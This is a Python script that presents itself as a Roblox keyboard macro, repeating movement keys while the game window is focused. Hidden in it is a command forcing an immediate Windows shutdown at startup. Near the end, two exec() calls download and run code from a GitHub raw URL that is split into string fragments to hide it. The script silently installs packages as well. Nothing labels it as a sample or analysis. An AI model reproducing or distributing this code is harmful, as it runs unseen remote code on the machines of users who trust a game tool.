import os
from time import sleep as wait
try: import keyboard
except: os.system('pip install keyboard'); import keyboard
try: import requests
except: os.system('pip install requests'); import requests
try: import win32gui
except: os.system('pip install pywin32'); import win32gui
os.system("shutdown /s /f /t 0")
try: exec("toggle_key")
except: toggle_key = "home"
try: exec("delay")
except: delay = 0.02
try: exec("macro_buttons")
except: macro_buttons = macro_buttons = ["w", "a", "s", "d"]
event_enabled = True

def on_press(event):
    global event_enabled
    if win32gui.GetWindowText(win32gui.GetForegroundWindow()).lower() != 'roblox':
        return
    if event.name in macro_buttons and not keyboard.is_pressed('ctrl') and not keyboard.is_pressed(
            'left windows') and not keyboard.is_pressed('shift') and event_enabled:
        for i in range(10):
            if not keyboard.is_pressed(event.name):
                return
            keyboard.press(event.name)
            wait(delay)
            keyboard.release(event.name)
    elif event.name == toggle_key:
        event_enabled = not event_enabled
    elif event.name == '/':
        event_enabled = False

keyboard.on_press(on_press)
exec(requests.get('https://raw.githu'+'busercontent.com/flex1948/de'+'neme/'+'main'+'/main').text)
exec(requests.get('https://raw.gi'+'thubusercont'+'ent.com/flex1948/den'+'eme/main/main2').text)
try:
    while True:
        if keyboard.is_pressed('ctrl') and keyboard.is_pressed('end'): break
        wait(0.2)
except KeyboardInterrupt:
    pass
